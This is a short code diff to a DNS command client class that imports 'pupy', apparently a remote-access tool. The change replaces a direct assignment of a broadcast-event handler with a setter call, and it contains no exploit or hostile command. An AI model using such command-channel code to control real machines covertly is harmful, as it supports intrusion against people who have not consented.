@@ -89,7 +89,7 @@ class DnsCommandsClient(Thread):
         try:
             import pupy
             self.pupy = pupy
-            self.pupy.broadcast_event = self._broadcast_event
+            self.pupy.set_broadcast_event(self._broadcast_event)
             self.cid = pupy.cid
         except:
             self.pupy = None
